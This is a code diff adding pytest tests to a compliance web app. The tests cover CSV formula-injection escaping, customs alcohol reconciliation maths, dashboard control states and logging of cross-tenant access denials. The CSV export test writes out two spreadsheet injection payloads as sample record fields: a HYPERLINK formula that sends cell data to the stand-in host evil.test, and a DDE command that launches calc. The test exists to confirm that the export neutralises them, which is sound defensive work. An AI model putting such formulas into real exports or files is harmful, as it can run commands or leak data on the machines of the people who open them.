@@ -1,16 +1,30 @@
 """HTTP contracts for the tenant-scoped Compliant product area."""
 
+import csv
+import io
+from decimal import Decimal
+from types import SimpleNamespace
 from unittest.mock import patch
 from uuid import uuid4
 
 import pytest
 
+from app.core.db.models.inventory_movement import InventoryMovementType
 from app.core.db.models.organisation import Organisation
 from app.core.db.models.user import UserRole
 from app.core.db.repositories.user_repo import UserRepository
 from app.core.security.auth_service import AuthService
-from app.features.compliant.service import ComplianceService
+from app.features.compliant.routes.api_routes import _csv_safe
+from app.features.compliant.service import ComplianceService, calculate_customs_reconciliation
 from tests.factories import DEFAULT_TEST_PASSWORD, OrganisationFactory
+
+
+def _movement(movement_type: str, quantity: str, unit: str) -> SimpleNamespace:
+    return SimpleNamespace(movement_type=movement_type, quantity=Decimal(quantity), unit=unit)
+
+
+def _product(abv_percent: str) -> SimpleNamespace:
+    return SimpleNamespace(abv_percent=Decimal(abv_percent))
 
 
 def _admin_client(db, flask_app):
@@ -172,6 +186,314 @@ def test_control_capture_requirements_are_enforced(db, flask_app):
         )
         assert invalid_link.status_code == 400
         assert "this organisation" in invalid_link.get_json()["error"]
+    finally:
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
+def test_csv_safe_prefixes_every_formula_trigger_character(trigger):
+    assert _csv_safe(f"{trigger}cmd|calc").startswith("'" + trigger)
+
+
+def test_csv_safe_leaves_ordinary_text_and_none_untouched():
+    assert _csv_safe("July excise entry") == "July excise entry"
+    assert _csv_safe(None) == ""
+
+
+def test_audit_pack_csv_export_neutralises_formula_injection(db, flask_app):
+    """A record title/evidence_reference starting with a formula-trigger character (=, +,
+    -, @) must not reach the CSV export unescaped: opened in Excel/Sheets/LibreOffice by
+    the auditor the pack is generated for, an unescaped cell can execute a formula (legacy
+    DDE, HYPERLINK exfiltration). See .agents/reports/compliant-platform/security-audit.md
+    finding F1."""
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
+        record = client.post(
+            "/api/compliant/records",
+            json={
+                "framework_slug": "customs-alcohol",
+                "control_id": "product-mapping",
+                "record_type": "attestation",
+                "title": '=HYPERLINK("http://evil.test/?x="&A1,"x")',
+                "evidence_reference": "+cmd|'/c calc'!A1",
+            },
+        )
+        assert record.status_code == 201
+        report = client.post("/api/compliant/reports/customs-alcohol", json={})
+        assert report.status_code == 201
+        report_id = report.get_json()["report"]["report_id"]
+        csv_body = client.get(f"/api/compliant/reports/{report_id}?format=csv").data.decode()
+        rows = list(csv.reader(io.StringIO(csv_body)))
+        data_row = rows[1]
+        assert data_row[4] == '\'=HYPERLINK("http://evil.test/?x="&A1,"x")'
+        assert data_row[8] == "'+cmd|'/c calc'!A1"
+    finally:
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+# --- calculate_customs_reconciliation: pure function, the product's core "live evidence"
+# calculation (Customs litres-of-alcohol reconciliation). Was 0% covered -- no test in the
+# suite exercised unit conversion, unprofiled/unsupported-unit accounting, or the
+# production/wastage split before this pass.
+
+
+def test_customs_reconciliation_converts_ml_and_l_and_splits_production_wastage():
+    profiles = {"House Gin": _product("40")}
+    movements = [
+        (_movement(InventoryMovementType.PRODUCTION.value, "5000", "ml"), "House Gin"),  # 5L @ 40% = 2 LAL
+        (_movement(InventoryMovementType.PRODUCTION.value, "2", "L"), "House Gin"),  # 2L @ 40% = 0.8 LAL
+        (_movement(InventoryMovementType.WASTAGE.value, "1000", "ml"), "House Gin"),  # 1L @ 40% = 0.4 LAL
+    ]
+    result = calculate_customs_reconciliation(profiles, movements)
+    assert result["production_litres_of_alcohol"] == "2.8000"
+    assert result["wastage_litres_of_alcohol"] == "0.4000"
+    assert result["unprofiled_movement_count"] == 0
+    assert result["unsupported_unit_movement_count"] == 0
+    assert result["profiled_product_count"] == 1
+
+
+@pytest.mark.parametrize("movement_type", [InventoryMovementType.ADD.value, InventoryMovementType.ADJUSTMENT.value])
+def test_customs_reconciliation_ignores_non_production_wastage_movement_types(movement_type):
+    profiles = {"House Gin": _product("40")}
+    movements = [(_movement(movement_type, "1000", "ml"), "House Gin")]
+    result = calculate_customs_reconciliation(profiles, movements)
+    assert result["production_litres_of_alcohol"] == "0.0000"
+    assert result["wastage_litres_of_alcohol"] == "0.0000"
+    assert result["unprofiled_movement_count"] == 0
+    assert result["unsupported_unit_movement_count"] == 0
+
+
+def test_customs_reconciliation_counts_unprofiled_and_unsupported_unit_movements_by_name():
+    profiles: dict = {}
+    movements = [
+        (_movement(InventoryMovementType.PRODUCTION.value, "1000", "ml"), "Unmapped Rum"),
+        (_movement(InventoryMovementType.PRODUCTION.value, "1000", "ml"), "Unmapped Rum"),
+        (_movement(InventoryMovementType.WASTAGE.value, "5", "kg"), "House Gin"),
+    ]
+    profiles["House Gin"] = _product("40")
+    result = calculate_customs_reconciliation(profiles, movements)
+    assert result["unprofiled_movement_count"] == 2
+    assert result["unprofiled_inventory_names"] == ["Unmapped Rum"]
+    assert result["unsupported_unit_movement_count"] == 1
+    assert result["unsupported_inventory_units"] == ["House Gin (kg)"]
+    # Neither an unprofiled nor an unsupported-unit movement contributes to the LAL totals.
+    assert result["production_litres_of_alcohol"] == "0.0000"
+    assert result["wastage_litres_of_alcohol"] == "0.0000"
+
+
+# --- Control-state evaluation (ComplianceService._control_state via /api/compliant/overview):
+# the "attention"/"setup"/"compliant" traffic-light logic that drives the dashboard. Several
+# branches (overdue/breached reasons, the reconciliation control's live-data-gap and
+# declared-vs-calculated-variance attention states, the CRM-mapping "setup" fallback, and the
+# consent-profile "compliant" state) had no coverage before this pass.
+
+
+def test_reconciliation_control_flags_attention_when_live_data_has_unprofiled_movements(db, flask_app):
+    from uuid import uuid4 as _uuid4
+
+    from app.core.db.models.inventory_item import InventoryItem
+    from app.core.db.models.inventory_movement import InventoryMovement
+    from app.core.domain.inventory_quantity_guard import (
+        InventoryQuantityWriteReason,
+        allow_inventory_quantity_write,
+    )
+
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert (
+            client.put(
+                "/api/compliant/profile",
+                json={"enabled": True, "settings": {"alcohol_product_types": ["spirits"]}},
+            ).status_code
+            == 200
+        )
+        assert (
+            client.post(
+                "/api/compliant/alcohol-products",
+                json={"inventory_name": "House Gin", "product_type": "spirits", "abv_percent": "40"},
+            ).status_code
+            == 201
+        )
+        # A production movement against a DIFFERENT, unprofiled item -- the live reconciliation
+        # scan should see it as an unprofiled movement and flag the reconciliation control.
+        with allow_inventory_quantity_write(InventoryQuantityWriteReason.REPOSITORY_CREATE):
+            item = InventoryItem(
+                org_id=org.id, name="Unmapped Vodka", unit="ml", quantity=Decimal("0"), inventory_type="final_product"
+            )
+            db.add(item)
+            db.flush()
+            db.add(
+                InventoryMovement(
+                    id=_uuid4(),
+                    org_id=org.id,
+                    inventory_item_id=item.id,
+                    movement_type=InventoryMovementType.PRODUCTION.value,
+                    quantity=Decimal("1000"),
+                    unit="ml",
+                )
+            )
+            db.commit()
+
+        overview = client.get("/api/compliant/overview").get_json()
+        framework = next(f for f in overview["frameworks"] if f["slug"] == "customs-alcohol")
+        reconciliation_control = next(c for c in framework["controls"] if c["control_id"] == "reconciliation")
+        assert reconciliation_control["state"] == "attention"
+        assert "unprofiled" in reconciliation_control["reason"].lower()
+    finally:
+        db.query(InventoryMovement).filter(InventoryMovement.org_id == org.id).delete(synchronize_session=False)
+        db.query(InventoryItem).filter(InventoryItem.org_id == org.id).delete(synchronize_session=False)
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+def test_reconciliation_control_flags_attention_when_declared_lal_exceeds_tolerance(db, flask_app):
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert (
+            client.put(
+                "/api/compliant/profile",
+                json={"enabled": True, "settings": {"alcohol_product_types": ["spirits"]}},
+            ).status_code
+            == 200
+        )
+        assert (
+            client.post(
+                "/api/compliant/alcohol-products",
+                json={"inventory_name": "House Gin", "product_type": "spirits", "abv_percent": "40"},
+            ).status_code
+            == 201
+        )
+        # No production/wastage movements exist, so calculated LAL is 0 -- a declared value
+        # far outside the default 0.01 tolerance must flag "attention", not "compliant".
+        record = client.post(
+            "/api/compliant/records",
+            json={
+                "framework_slug": "customs-alcohol",
+                "control_id": "reconciliation",
+                "record_type": "reading",
+                "title": "Declared LAL",
+                "period_start": "2026-07-01",
+                "period_end": "2026-07-31",
+                "evidence_reference": "Customs filing 2026-07",
+                "declared_litres_of_alcohol": "5.0",
+            },
+        )
+        assert record.status_code == 201, record.get_json()
+
+        overview = client.get("/api/compliant/overview").get_json()
+        framework = next(f for f in overview["frameworks"] if f["slug"] == "customs-alcohol")
+        reconciliation_control = next(c for c in framework["controls"] if c["control_id"] == "reconciliation")
+        assert reconciliation_control["state"] == "attention"
+        assert "differs from calculated" in reconciliation_control["reason"]
+    finally:
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+def test_consent_profile_control_is_compliant_once_council_and_consent_reference_are_set(db, flask_app):
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert (
+            client.put(
+                "/api/compliant/profile",
+                json={
+                    "enabled": True,
+                    "council_name": "Auckland Council",
+                    "trade_waste_consent_reference": "TWC-12345",
+                    "settings": {"alcohol_product_types": ["spirits"], "trade_waste_council": "auckland-watercare"},
+                },
+            ).status_code
+            == 200
+        )
+        overview = client.get("/api/compliant/overview").get_json()
+        trade_waste_framework = next(
+            (f for f in overview["frameworks"] if any(c["control_id"] == "consent-profile" for c in f["controls"])),
+            None,
+        )
+        assert trade_waste_framework is not None, "expected a framework with a consent-profile control to apply"
+        consent_control = next(c for c in trade_waste_framework["controls"] if c["control_id"] == "consent-profile")
+        assert consent_control["state"] == "compliant"
+        assert consent_control["reason"] == "Council consent profile configured"
+    finally:
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+# --- Observability: a rejected cross-tenant lookup must be traceable, not just a bare
+# 404/400. Same access_denied event name app/core/security/permissions.py and
+# inventory_repo.py use, per the observability skill's rule.
+
+
+def test_cross_org_report_lookup_emits_access_denied(db, flask_app, caplog):
+    import logging
+
+    org_a, client_a = _admin_client(db, flask_app)
+    org_b, client_b = _admin_client(db, flask_app)
+    try:
+        assert client_a.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
+        report = client_a.post("/api/compliant/reports/customs-alcohol", json={})
+        assert report.status_code == 201
+        report_id = report.get_json()["report"]["report_id"]
+
+        with caplog.at_level(logging.WARNING):
+            resp = client_b.get(f"/api/compliant/reports/{report_id}")
+        assert resp.status_code == 404
+
+        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
+        assert denials, f"cross-org report lookup was not logged: {[r.getMessage() for r in caplog.records]}"
+        assert "report_not_found_or_cross_org" in denials[0].getMessage()
+    finally:
+        db.query(Organisation).filter(Organisation.id.in_([org_a.id, org_b.id])).delete(synchronize_session=False)
+        db.commit()
+
+
+def test_own_org_report_lookup_does_not_log_access_denied(db, flask_app, caplog):
+    import logging
+
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
+        report = client.post("/api/compliant/reports/customs-alcohol", json={})
+        assert report.status_code == 201
+        report_id = report.get_json()["report"]["report_id"]
+
+        with caplog.at_level(logging.WARNING):
+            resp = client.get(f"/api/compliant/reports/{report_id}")
+        assert resp.status_code == 200
+
+        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
+        assert denials == [], f"legitimate same-org lookup must not log access_denied: {denials}"
+    finally:
+        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
+        db.commit()
+
+
+def test_cross_org_source_ref_emits_access_denied(db, flask_app, caplog):
+    import logging
+
+    org, client = _admin_client(db, flask_app)
+    try:
+        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
+        with caplog.at_level(logging.WARNING):
+            response = client.post(
+                "/api/compliant/records",
+                json={
+                    "framework_slug": "customs-alcohol",
+                    "control_id": "movement-evidence",
+                    "record_type": "attestation",
+                    "title": "Probe",
+                    "evidence_reference": "dispatch-note-1",
+                    "source_refs": [str(uuid4())],
+                },
+            )
+        assert response.status_code == 400
+
+        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
+        assert denials, f"invalid source_ref was not logged: {[r.getMessage() for r in caplog.records]}"
+        assert "source_ref_not_in_org" in denials[0].getMessage()
     finally:
         db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
         db.commit()
